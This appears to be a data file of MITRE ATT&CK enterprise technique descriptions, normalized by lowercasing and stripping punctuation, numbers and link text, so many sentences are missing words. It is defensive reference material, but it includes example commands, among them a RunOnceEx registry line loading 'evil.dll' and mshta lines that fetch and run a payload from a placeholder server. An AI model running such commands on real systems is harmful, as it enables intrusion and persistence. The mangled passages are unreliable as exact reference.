attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109,['enterprise-attack'],['T1590'],Gather Victim Network Information,adversaries may gather information about the victim's networks that can be used during targeting  information about networks may include a variety of details  including administrative data  ex  ip ranges  domain names  etc_  as well as specifics regarding its topology and operations_  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  information about networks may also be exposed to adversaries via online or other accessible data sets  ex   search open technical  dns dumpster  citation  circl passive dns  gathering this information may reveal opportunities for other forms of reconnaissance  ex   active  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   trusted
attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82,['enterprise-attack'],['T1210'],Exploitation of Remote Services,adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network  exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program  service  or within the operating system software or kernel itself to execute adversary controlled code_ a common goal for post compromise exploitation of remote services is for lateral movement to enable access to a remote system_  an adversary may need to determine if the remote system is in a vulnerable state  which may be done through  network service  or other discovery methods looking for common  vulnerable software that may be deployed in the network  the lack of certain patches that may indicate vulnerabilities   or security software that may be used to detect or contain remote exploitation  servers are likely a high value target for lateral movement exploitation  but endpoint systems may also be at risk if they provide an advantage or access to additional resources_  there are several well known vulnerabilities that exist in common services such as smb  citation  cis multiple smb vulnerabilities  and rdp  citation  nvd cve            as well as applications that may be used within internal networks such as mysql  citation  nvd cve            and web server services_ citation  nvd cve             depending on the permissions level of the vulnerable remote service an adversary may achieve  exploitation for privilege  as a result of lateral movement exploitation as well 
attack-pattern--9ddc2534-e91c-4dab-a8f6-43dab81e8142,['enterprise-attack'],['T1502'],Parent PID Spoofing,adversaries may spoof the parent process identifier  ppid  of a new process to evade process monitoring defenses or to elevate privileges  new processes are typically spawned directly from their parent  or calling  process unless explicitly specified  one way of explicitly assigning the ppid of a new process is via the createprocess api call  which supports a parameter that defines the ppid to use_ citation  didierstevens selectmyparent nov       this functionality is used by windows features such as user account control  uac  to correctly set the ppid after a requested elevated process is spawned by system  typically via svchost_exe or consent_exe  rather than the current user context_ citation  microsoft uac nov        adversaries may abuse these mechanisms to evade defenses  such as those blocking processes spawning directly from office documents  and analysis targeting unusual potentially malicious parent child process relationships  such as spoofing the ppid of  to be explorer_exe rather than an office document delivered as part of  spearphishing  countercept ppid spoofing dec       this spoofing could be executed via vba  within a malicious office document or any code that can perform  native  ctd ppid spoofing macro mar       citation  countercept ppid spoofing dec        explicitly assigning the ppid may also enable  privilege   given appropriate access rights to the parent process   for example  an adversary in a privileged user context  i_e  administrator  may spawn a new process and assign the parent as a process running as system  such as lsass_exe   causing the new process to be elevated via the inherited access token_ citation  xpnsec ppid nov      
attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d,['enterprise-attack'],['T1142'],Keychain,keychains are the built in way for macos to keep track of users' passwords and credentials for many services and features such as wifi passwords  websites  secure notes  certificates  and kerberos  keychain files are located in   library keychains   library keychains   and  network library keychains    citation  wikipedia keychain  the security command line utility  which is built into macos by default  provides a useful way to manage these credentials_  to manage their credentials  users have to use additional credentials to access their keychain  if an adversary knows the credentials for the login keychain  then they can get access to all the other credentials stored in this vault   citation  external to da  the os x way  by default  the passphrase for the keychain is the user s logon credentials 
attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747,['enterprise-attack'],['T1534'],Internal Spearphishing,adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment  internal spearphishing is multi staged campaign where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user  adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt_ citation  trend micro when phishing starts from the inside        adversaries may leverage  spearphishing  or  spearphishing  as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through  input  on sites that mimic email login interfaces_  there have been notable incidents where internal spearphishing has been used  the eye pyramid campaign used phishing emails with malicious attachments for lateral movement between victims  compromising nearly        email accounts in the process_ citation  trend micro when phishing starts from the inside       the syrian electronic army  sea  compromised email accounts at the financial times  ft  to steal additional account credentials  once ft learned of the campaign and began warning employees of the threat  the sea sent phishing emails mimicking the financial times it department and were able to compromise even more users_ citation  the financial times ltd     _ 
attack-pattern--9e80ddfb-ce32-4961-a778-ca6a10cfae72,['enterprise-attack'],['T1169'],Sudo,the sudoers file   etc sudoers  describes which users can run which commands and from which terminals  this also describes which commands users can run as other users or groups  this provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed  typically by prompting for a password  however  the sudoers file can also specify when to not prompt users for passwords with a line like user  all  all  nopasswd  all  citation  osx_dok malware     adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges  you must have elevated privileges to edit this file though 
attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd,['enterprise-attack'],['T1574.010'],Services File Permissions Weakness,adversaries may execute their own malicious payloads by hijacking the binaries used by services  adversaries may use flaws in the permissions of windows services to replace the binary that is executed upon service start  these service processes may automatically execute specific binaries as part of their functionality or to perform other actions  if the permissions on the file system directory containing a target binary  or permissions on the binary itself are improperly set  then the target binary may be overwritten with another binary using user level permissions and executed by the original process  if the original process and thread are running under a higher permissions level  then the replaced binary will also execute under higher level permissions  which could include system_  adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level  if the executing process is set to run at a specific time or during a certain event  e_g_  system bootup  then this technique can also be used for persistence 
attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279,['enterprise-attack'],['T1547.001'],Registry Run Keys / Startup Folder,adversaries may achieve persistence by adding a program to a startup folder or referencing it with a registry run key  adding an entry to the  run keys  in the registry or startup folder will cause the program referenced to be executed when a user logs in_ citation  microsoft run key  these programs will be executed under the context of the user and will have the account's associated permissions level_  placing a program within a startup folder will also cause that program to execute when a user logs in  there is a startup folder location for individual user accounts as well as a system wide startup folder that will be checked regardless of which user account logs in  the startup folder path for the current user is c  users   username  appdata roaming microsoft windows start menu programs startup  the startup folder path for all users is c  programdata microsoft windows start menu programs startup_  the following run keys are created by default on windows systems     hkey_current_user software microsoft windows currentversion run   hkey_current_user software microsoft windows currentversion runonce   hkey_local_machine software microsoft windows currentversion run   hkey_local_machine software microsoft windows currentversion runonce  run keys may exist under multiple hives_ citation  microsoft wow    node       citation  malwarebytes wow    node       the hkey_local_machine software microsoft windows currentversion runonceex is also available but is not created by default on windows vista and newer  registry run key entries can reference programs directly or list them as a dependency_ citation  microsoft run key  for example  it is possible to load a dll at logon using a  depend  key with runonceex  reg add hklm software microsoft windows currentversion runonceex      depend  v    d  c  temp evil _ dll   citation  oddvar moe runonceex mar        the following registry keys can be used to set startup folder items for persistence     hkey_current_user software microsoft windows currentversion explorer user shell folders   hkey_current_user software microsoft windows currentversion explorer shell folders   hkey_local_machine software microsoft windows currentversion explorer shell folders   hkey_local_machine software microsoft windows currentversion explorer user shell folders  the following registry keys can control automatic startup of services during boot     hkey_local_machine software microsoft windows currentversion runservicesonce   hkey_current_user software microsoft windows currentversion runservicesonce   hkey_local_machine software microsoft windows currentversion runservices   hkey_current_user software microsoft windows currentversion runservices  using policy settings to specify startup programs creates corresponding values in either of two registry keys     hkey_local_machine software microsoft windows currentversion policies explorer run   hkey_current_user software microsoft windows currentversion policies explorer run  the winlogon key controls actions that occur when a user logs on to a computer running windows    most of these actions are under the control of the operating system  but you can also add custom actions here  the hkey_local_machine software microsoft windows nt currentversion winlogon userinit and hkey_local_machine software microsoft windows nt currentversion winlogon shell subkeys can automatically launch programs_  programs listed in the load value of the registry key hkey_current_user software microsoft windows nt currentversion windows run when any user logs on_  by default  the multistring bootexecute value of the registry key hkey_local_machine system currentcontrolset control session manager is set to autocheck autochk    this value causes windows  at startup  to check the file system integrity of the hard disks if the system has been shut down abnormally  adversaries can add other programs or processes to this registry value which will automatically launch at boot_  adversaries can use these configuration locations to execute malware  such as remote access tools  to maintain persistence through system reboots  adversaries may also use  to make the registry entries look as if they are associated with legitimate programs 
attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925,['enterprise-attack'],['T1199'],Trusted Relationship,adversaries may breach or otherwise leverage organizations who have access to intended victims  access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network_  organizations often grant elevated access to second or third party external providers in order to allow them to manage internal systems as well as cloud based environments  some examples of these relationships include it services contractors  managed security providers  infrastructure contractors  e_g  hvac  elevators  physical security   the third party provider's access may be intended to be limited to the infrastructure being maintained  but may exist on the same network as the rest of the enterprise  as such   valid  used by the other party for access to internal network systems may be compromised and used_ citation  cisa it service providers   in office     environments  organizations may grant microsoft partners or resellers delegated administrator permissions  by compromising a partner or reseller account  an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant_ citation  office     delegated administration 
attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b,['enterprise-attack'],['T1136.003'],Cloud Account,adversaries may create a cloud account to maintain access to victim systems  with a sufficient level of access  such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system_ citation  microsoft o    admin roles  citation  microsoft support o    add another admin  october       citation  aws create iam user  citation  gcp create cloud identity users  citation  microsoft azure ad users   adversaries may create accounts that only have access to specific cloud services  which can reduce the chance of detection 
attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b,['enterprise-attack'],['T1069.001'],Local Groups,adversaries may attempt to find local system groups and permission settings  the knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group  adversaries may use this information to determine which users have elevated permissions  such as the users found within the local administrators group_  commands such as net localgroup of the  utility  dscl    list  groups on macos  and groups on linux can list local groups 
attack-pattern--a0a189c8-d3bd-4991-bf6f-153d185ee373,['enterprise-attack'],['T1149'],LC_MAIN Hijacking,  this technique has been deprecated and should no longer be used_    as of os x   _   mach o binaries introduced a new header called lc_main that points to the binary s entry point for execution  previously  there were two headers to achieve this same effect  lc_thread and lc_unixthread   citation  prolific osx malware history   the entry point for a binary can be hijacked so that initial execution flows to a malicious addition  either another section or a code cave  and then goes back to the initial entry point so that the victim doesn t know anything was different   citation  methods of mac malware persistence   by modifying a binary in this way  application whitelisting can be bypassed because the file name or application path is still the same 
attack-pattern--a0e6614a-7740-4b24-bd65-f1bde09fc365,['enterprise-attack'],['T1593'],Search Open Websites/Domains,adversaries may search freely available websites and or domains for information about victims that can be used during targeting  information about victims may be available in various online sites  such as social media  new sites  or those hosting information about business operations such as hiring or requested rewarded contracts_ citation  cyware social media  citation  securitytrails google hacking  citation  exploitdb googlehacking   adversaries may search in different online sites depending on what information they seek to gather  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open technical  establishing operational resources  ex   establish  or  compromise  and or initial access  ex   external remote  or
attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27,['enterprise-attack'],['T1098'],Account Manipulation,adversaries may manipulate accounts to maintain access to victim systems  account manipulation may consist of any action that preserves adversary access to a compromised account  such as modifying credentials or permission groups  these actions could also include account activity designed to subvert security policies  such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials    in order to create or manipulate accounts  the adversary must already have sufficient permissions on systems or the domain  however  account manipulation may also lead to privilege escalation where modifications grant access to additional roles  permissions  or higher privileged  valid
attack-pattern--a127c32c-cbb0-4f9d-be07-881a792408ec,['enterprise-attack'],['T1170'],Mshta,mshta_exe is a utility that executes microsoft html applications  hta   hta files have the file extension _hta   citation  wikipedia html application  htas are standalone applications that execute using the same models and technologies of internet explorer  but outside of the browser   citation  msdn html applications   adversaries can use mshta_exe to proxy execution of malicious _hta files and javascript or vbscript through a trusted windows utility  there are several examples of different types of threats leveraging mshta_exe during initial compromise and for execution of code  citation  cylance dust storm   citation  red canary hta abuse part deux   citation  fireeye attacks leveraging hta   citation  airbus security kovter analysis   citation  fireeye fin  april         files may be executed by mshta_exe through an inline script  mshta vbscript close execute  getobject   script https     webserver payload _ sct        they may also be executed directly from urls  mshta http     webserver payload _ hta  mshta_exe can be used to bypass application whitelisting solutions that do not account for its potential use  since mshta_exe executes outside of the internet explorer's security context  it also bypasses browser security settings   citation  lolbas mshta 
attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776,['enterprise-attack'],['T1048'],Exfiltration Over Alternative Protocol,adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel  the data may also be sent to an alternate network location from the main command and control server     alternate protocols include ftp  smtp  http s  dns  smb  or any other network protocol not being used as the main command and control channel  different protocol channels could also include web services such as cloud storage  adversaries may also opt to encrypt and or obfuscate these alternate channels     exfiltration over alternative  can be done using various common operating system utilities such as  or ftp_ citation  palo alto oilrig oct       on macos and linux curl may be used to invoke protocols such as http s or ftp s to exfiltrate data from a system_ citation     macos common tools and techniques 
attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6,['enterprise-attack'],['T1547.006'],Kernel Modules and Extensions,adversaries may modify the kernel to automatically execute programs on system boot  loadable kernel modules  lkms  are pieces of code that can be loaded and unloaded into the kernel upon demand  they extend the functionality of the kernel without the need to reboot the system  for example  one type of module is the device driver  which allows the kernel to access hardware connected to the system_ citation  linux kernel programming    when used maliciously  lkms can be a type of kernel mode  that run with the highest operating system privilege  ring   _ citation  linux kernel module programming guide  common features of lkm based rootkits include  hiding itself  selective hiding of files  processes and network activity  as well as log tampering  providing authenticated backdoors  and enabling root access to non privileged users_ citation  idefense rootkit overview   kernel extensions  also called kext  are used in macos to load functionality onto a system similar to lkms for linux  since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel  kexts are not governed by macos security policies  kexts are loaded and unloaded through kextload and kextunload commands  kexts need to be signed with a developer id that is granted privileges by apple allowing it to sign kernel extensions  developers without these privileges may still sign kexts but they will not load unless sip is disabled  if sip is enabled  the kext signature is verified before being added to the auxkc_ citation  system and kernel extensions in macos   since macos catalina   _    kernel extensions have been deprecated in favor of system extensions  however  kexts are still allowed as  legacy system extensions  since there is no system extension for kernel programming interfaces_ citation  apple kernel extension deprecation   adversaries can use lkms and kexts to conduct  and or  privilege  on a system  examples have been found in the wild  and there are some relevant open source projects as well_ citation  volatility phalanx   citation  crowdstrike linux rootkit  citation  github reptile  citation  github diamorphine  citation  rsac      san francisco patrick wardle  citation  synack secure kernel extension broken  citation  securelist ventir  citation  trend micro skidmap 
attack-pattern--a2029942-0a85-4947-b23c-ca434698171d,['enterprise-attack'],['T1056.002'],GUI Input Capture,adversaries may mimic common operating system gui components to prompt users for credentials with a seemingly legitimate prompt  when programs are executed that need additional privileges than are present in the current user context  it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task  ex   bypass user account   adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage  such as a fake installer requiring additional access or a fake malware removal suite_ citation  osx malware exploits mackeeper  this type of prompt can be used to collect credentials via various languages such as  logrhythm do you trust oct       citation  osx keydnap malware  citation  spoofing credential dialogs  and  logrhythm do you trust oct       citation  enigma phishing for credentials jan       citation  spoofing credential dialogs  on linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line  i_e   unix  spoofing credential dialogs 
attack-pattern--a257ed11-ff3b-4216-8c9d-3938ef57064c,['enterprise-attack'],['T1097'],Pass the Ticket,pass the ticket  ptt  is a method of authenticating to a system using kerberos tickets without having access to an account's password  kerberos authentication can be used as the first step to lateral movement to a remote system_  in this technique  valid kerberos tickets for  valid  are captured by  os credential  a user's service tickets or ticket granting ticket  tgt  may be obtained  depending on the level of access  a service ticket allows for access to a particular resource  whereas a tgt can be used to request service tickets from the ticket granting service  tgs  to access any resource the user has privileges to access   citation  adsecurity ad kerberos attacks   citation  gentilkiwi pass the ticket   silver tickets can be obtained for services that use kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource  e_g_  sharepoint    citation  adsecurity ad kerberos attacks   golden tickets can be obtained for the domain using the key distribution service account krbtgt account ntlm hash  which enables generation of tgts for any account in active directory   citation  campbell      
attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0,['enterprise-attack'],['T1588.002'],Tool,adversaries may buy  steal  or download software tools that can be used during targeting  tools can be open or closed source  free or commercial  a tool can be used for malicious purposes by an adversary  but  unlike malware  were not intended to be used for those purposes  ex   tool acquisition can involve the procurement of commercial software licenses  including for red teaming tools such as  cobalt  commercial software may be obtained through purchase  stealing licenses  or licensed copies of the software   or cracking trial versions_ citation  recorded future beacon        adversaries may obtain tools to support their operations  including to support execution of post compromise behaviors  in addition to freely downloading or purchasing software  adversaries may steal software and or software licenses from third party entities  including other adversaries  
attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829,['enterprise-attack'],['T1052.001'],Exfiltration over USB,adversaries may attempt to exfiltrate data over a usb connected physical device  in certain circumstances  such as an air gapped network compromise  exfiltration could occur via a usb device introduced by a user  the usb device could be used as the final exfiltration point or to hop between otherwise disconnected systems 
attack-pattern--a4657bc9-d22f-47d2-a7b7-dd6ec33f3dde,['enterprise-attack'],['T1574.013'],KernelCallbackTable,adversaries may abuse the kernelcallbacktable of a process to hijack its execution flow in order to run their own payloads_ citation  lazarus apt january       citation  finfisher exposed   the kernelcallbacktable can be found in the process environment block  peb  and is initialized to an array of graphic functions available to a gui process once user  _dll is loaded_ citation  windows process injection kernelcallbacktable   an adversary may hijack the execution flow of a process using the kernelcallbacktable by replacing an original callback function with a malicious payload  modifying callback functions can be achieved in various ways involving related behaviors such as  reflective code  or  process  into another process_  a pointer to the memory address of the kernelcallbacktable can be obtained by locating the peb  ex  via a call to the ntqueryinformationprocess    native  function   once the pointer is located  the kernelcallbacktable can be duplicated  and a function in the table  e_g_  fncopydata  set to the address of a malicious payload  ex  via writeprocessmemory     the peb is then updated with the new address of the table  once the tampered function is invoked  the malicious payload will be triggered_ citation  lazarus apt january        the tampered function is typically invoked using a windows message  after the process is hijacked and malicious code is executed  the kernelcallbacktable may also be restored to its original state by the rest of the malicious payload_ citation  lazarus apt january       use of the kernelcallbacktable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process 
attack-pattern--a51eb150-93b1-484b-a503-e51453b127a4,['enterprise-attack'],['T1597'],Search Closed Sources,adversaries may search and gather information about victims from closed sources that can be used during targeting  information about victims may be available for purchase from reputable private sources and databases  such as paid subscriptions to feeds of technical threat intelligence data_ citation  d secutrity cti feeds  adversaries may also purchase information from less reputable sources such as dark web or cybercrime blackmarkets_ citation  zdnet selling data   adversaries may search in different closed databases depending on what information they seek to gather  information from these sources may reveal opportunities for other forms of reconnaissance  ex   phishing for  or  search open  establishing operational resources  ex   develop  or  obtain  and or initial access  ex   external remote  or  valid
attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21,['enterprise-attack'],['T1053.006'],Systemd Timers,adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code  systemd timers are unit files with file extension _timer that control services  timers can be set to run on a calendar event or after a time span relative to a starting point  they can be used as an alternative to  in linux environments_ citation  archlinux systemd timers aug       systemd timers may be activated remotely via the systemctl command line utility  which operates over  systemd remote control   each _timer file must have a corresponding _service file with the same name  e_g_  example_timer and example_service  _service files are  systemd  unit files that are managed by the systemd system and service manager_ citation  linux man pages  systemd january       privileged timers are written to  etc systemd system  and  usr lib systemd system while user level are written to   _config systemd user _  an adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence_ citation  arch linux package systemd compromise bleepingcomputer   jul      citation  gist arch package compromise   jul      citation  acroread package compromised arch linux mail  jul      timers installed using privileged paths may be used to maintain root level persistence  adversaries may also install user level timers to achieve user level persistence 
attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b,['enterprise-attack'],['T1566'],Phishing,adversaries may send phishing messages to gain access to victim systems  all forms of phishing are electronically delivered social engineering  phishing can be targeted  known as spearphishing  in spearphishing  a specific individual  company  or industry will be targeted by the adversary  more generally  adversaries can conduct non targeted phishing  such as in mass malware spam campaigns_  adversaries may send victims emails containing malicious attachments or links  typically to execute malicious code on victim systems  phishing may also be conducted via third party services  like social media platforms  phishing may also involve social engineering techniques  such as posing as a trusted source 
attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228,['enterprise-attack'],['T1061'],Graphical User Interface,  this technique has been deprecated  please use  remote  where appropriate_    the graphical user interfaces  gui  is a common way to interact with an operating system  adversaries may use a system's gui during an operation  commonly through a remote interactive session such as  remote desktop  instead of through a  command and scripting  to search for information and execute files via mouse double click events  the windows run command  citation  wikipedia run command   or other potentially difficult to monitor interactions 
attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc,['enterprise-attack'],['T1542.004'],ROMMONkit,adversaries may abuse the rom monitor  rommon  by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect   citation  cisco synful knock evolution  citation  cisco blog legacy device attacks    rommon is a cisco network device firmware that functions as a boot loader  boot image  or boot helper to initialize hardware and software when the platform is powered on or reset  similar to  tftp  an adversary may upgrade the rommon image locally or remotely  for example  through tftp  with adversary code and restart the device in order to overwrite the existing rommon image  this provides adversaries with the means to update the rommon to gain persistence on a system in a way that may be difficult to detect 
attack-pattern--a6937325-9321-4e2e-bb2b-3ed2d40b2a9d,['enterprise-attack'],['T1218.001'],Compiled HTML File,adversaries may abuse compiled html files  _chm  to conceal malicious code  chm files are commonly distributed as part of the microsoft html help system  chm files are compressed compilations of various content such as html documents  images  and scripting web related programming languages such vba  jscript  java  and activex   citation  microsoft html help may       chm content is displayed using underlying components of the internet explorer browser  citation  microsoft html help activex  loaded by the html help executable program  hh_exe    citation  microsoft html help executable program   a custom chm file containing embedded payloads could be delivered to a victim then triggered by  user  chm execution may also bypass application application control on older and or unpatched systems that do not account for execution of binaries through hh_exe   citation  msitpros chm aug        citation  microsoft cve           aug      
attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c,['enterprise-attack'],['T1070.005'],Network Share Connection Removal,adversaries may remove share connections that are no longer useful in order to clean up traces of their operation  windows shared drive and  smb windows admin  connections can be removed when no longer needed   is an example utility that can be used to remove network share connections with the net use   system share  delete command   citation  technet net use 
attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d,['enterprise-attack'],['T1090.003'],Multi-hop Proxy,to disguise the source of malicious traffic  adversaries may chain together multiple proxies  typically  a defender will be able to identify the last proxy traffic traversed before it enters their network  the defender may or may not be able to identify any previous proxies before the last hop proxy  this technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source  a particular variant of this behavior is to use onion routing networks  such as the publicly available tor network   citation  onion routing   in the case of network infrastructure  particularly routers  it is possible for an adversary to leverage multiple compromised devices to create a multi hop proxy chain within the wide area network  wan  of the enterprise   by leveraging  patch system  adversaries can add custom code to the affected network devices that will implement onion routing between those nodes   this custom onion routing network will transport the encrypted c  traffic through the compromised population  allowing adversaries to communicate with any device within the onion routing network   this method is dependent upon the  network boundary  method in order to allow the adversaries to cross the protected network boundary of the internet perimeter and into the organization s wan  protocols such as icmp may be used as a transport 
attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd,['enterprise-attack'],['T1110'],Brute Force,adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained  without knowledge of the password for an account or set of accounts  an adversary may systematically guess the password using a repetitive or iterative mechanism  brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data  such as password hashes_  brute forcing credentials may take place at various points during a breach  for example  adversaries may attempt to brute force access to  valid  within a victim environment leveraging knowledge gathered from other post compromise behaviors such as  os credential   account  or  password policy  adversaries may also combine brute forcing activity with behaviors such as  external remote  as part of initial access 
attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56,['enterprise-attack'],['T1059.004'],Unix Shell,adversaries may abuse unix shell commands and scripts for execution  unix shells are the primary command prompt on linux and macos systems  though many variations of the unix shell exist  e_g  sh  bash  zsh  etc_  depending on the specific os or distribution_ citation  dienet bash  citation  apple zshell  unix shells can control every aspect of a system  with certain commands requiring elevated privileges_  unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops  common uses of shell scripts include long or repetitive tasks  or the need to run the same set of commands on multiple systems_  adversaries may abuse unix shells to execute various commands or payloads  interactive shells may be accessed through command and control channels or during lateral movement such as with  adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence 
attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634,['enterprise-attack'],['T1137.003'],Outlook Forms,adversaries may abuse microsoft outlook forms to obtain persistence on a compromised system  outlook forms are used as templates for presentation and functionality in outlook messages  custom outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom outlook form_ citation  sensepost outlook forms   once malicious forms have been added to the user s mailbox  they will be loaded when outlook is started  malicious forms will execute when an adversary sends a specifically crafted email to the user_ citation  sensepost outlook forms 
attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda,['enterprise-attack'],['T1157'],Dylib Hijacking,macos and os x use a common method to look for required dynamic libraries  dylib  to load into a program based on search paths  adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence_  a common method is to see what dylibs an application uses  then plant a malicious version with the same name higher up in the search path  this typically results in the dylib being in the same folder as the application itself   citation  writing bad malware for osx   citation  malware persistence on os x   if the program is configured to run at a higher privilege level than the current user  then when the dylib is loaded into the application  the dylib will also run at that elevated level  this can be used by adversaries as a privilege escalation technique 
attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579,['enterprise-attack'],['T1562.001'],Disable or Modify Tools,adversaries may modify and or disable security tools to avoid possible detection of their malware tools and activities  this may take many forms  such as killing security software processes or services  modifying   deleting registry keys or configuration files so that tools do not operate properly  or other methods to interfere with security tools scanning or reporting information  adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems_  adversaries may also tamper with artifacts deployed and utilized by security tools  security tools may make dynamic changes to system components in order to maintain visibility into specific events  for example  security products may load their own modules and or modify those loaded by processes to facilitate data collection  similar to  indicator  adversaries may unhook or otherwise modify these features added by tools  especially those that exist in userland or are otherwise potentially accessible to adversaries  to avoid detection_ citation  outflank system calls  citation  mdsec system calls   in cloud environments  tools disabled by adversaries may include cloud monitoring agents that report back to services such as aws cloudwatch or google cloud monitor_  furthermore  although defensive tools may have anti tampering mechanisms  adversaries may abuse tools such as legitimate rootkit removal kits to impair and or disable these tools  for example  adversaries have used tools such as gmer to find and shut down hidden processes and antivirus software on infected systems_  additionally  adversaries may exploit legitimate drivers from anti virus software to gain access to kernel space  i_e   exploitation for privilege  which may lead to bypassing anti tampering features 
attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931,['enterprise-attack'],['T1565'],Data Manipulation,adversaries may insert  delete  or manipulate data in order to influence external outcomes or hide activity  thus threatening the integrity of the data  by manipulating data  adversaries may attempt to affect a business process  organizational understanding  or decision making_  the type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d,['enterprise-attack'],['T1559'],Inter-Process Communication,adversaries may abuse inter process communication  ipc  mechanisms for local code or command execution  ipc is typically used by processes to share data  communicate with each other  or synchronize execution  ipc is also commonly used to avoid situations such as deadlocks  which occurs when processes are stuck in a cyclic waiting pattern    adversaries may abuse ipc to execute arbitrary code or commands  ipc mechanisms may differ depending on os  but typically exists in a form accessible through programming languages libraries or native interfaces such as windows  dynamic data  or  component object  linux environments support several different ipc mechanisms  two of which being sockets and pipes_ citation  linux ipc  higher level execution mediums  such as those of  command and scripting  may also leverage underlying ipc mechanisms  adversaries may also use  remote  such as  distributed component object  to facilitate remote ipc execution_ citation  fireeye hunting com june      
attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842,['enterprise-attack'],['T1001'],Data Obfuscation,adversaries may obfuscate command and control traffic to make it more difficult to detect  command and control  c   communications are hidden  but not necessarily encrypted  in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen  this encompasses many methods  such as adding junk data to protocol traffic  using steganography  or impersonating legitimate protocols 
attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c,['enterprise-attack'],['T1039'],Data from Network Shared Drive,adversaries may search network shares on computers they have compromised to find files of interest  sensitive data can be collected from remote systems via shared network drives  host shared directory  network file server  etc_  that are accessible from the current system prior to exfiltration  interactive command shells may be in use  and common functionality within  may be used to gather information 
attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2,['enterprise-attack'],['T1584.006'],Web Services,adversaries may compromise access to third party web services that can be used during targeting  a variety of popular websites exist for legitimate users to register for web based services  such as github  twitter  dropbox  google  etc  adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations  such web services can be abused during later stages of the adversary lifecycle  such as during command and control   web  or  exfiltration over web  recorded future turla infra       using common services  such as those offered by google or twitter  makes it easier for adversaries to hide in expected noise  by utilizing a web service  particularly when access is stolen from legitimate users  adversaries can make it difficult to physically tie back operations to them 
attack-pattern--ae7f3575-0a5e-427e-991b-fe03ad44c754,['enterprise-attack'],['T1601'],Modify System Image,adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves   on such devices  the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file_  to change the operating system  the adversary typically only needs to affect this one file  replacing or modifying it   this can either be done live in memory during system runtime for immediate effect  or in storage to implement the change on the next boot of the network device 
